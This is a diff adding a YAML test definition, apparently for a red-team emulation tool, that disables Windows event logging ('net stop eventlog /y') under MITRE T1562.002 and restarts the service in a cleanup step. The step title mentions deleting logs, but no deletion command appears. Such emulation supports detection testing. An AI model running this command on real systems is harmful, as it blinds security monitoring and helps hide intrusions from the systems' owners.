@@ -1,0 +1,35 @@
+---
+api_version: 2.0
+uuid: bc50464b-2603-4b1b-8854-0c726423e3ec
+name: Disable Event Logging in Windows
+authors:
+  - hmashru
+description: |
+  This TTP disables event logging in Windows. This can be used to hide malicious activity from security tools.
+  Threat Intel: https://thedfirreport.com/2021/11/15/exchange-exploit-leads-to-domain-wide-ransomware/
+requirements:
+  platforms:
+    - os: windows
+  superuser: true
+mitre:
+  tactics:
+    - TA0005 Defense Evasion
+  techniques:
+    - T1562 Impair Defenses
+  subtechniques:
+    - T1562.002 Disable Windows Event Logging
+steps:
+  - name: Disable event logging and delete logs
+    executor: powershell
+    inline: |
+      echo "Disabling event logging"
+      net stop eventlog /y
+      echo "Verifying event logging is disabled"
+      Get-Service eventlog
+    cleanup:
+      executor: powershell
+      inline: |
+        echo "Re-enabling event logging"
+        net start eventlog
+        echo "Verifying event logging is renabled"
+        Get-Service eventlog
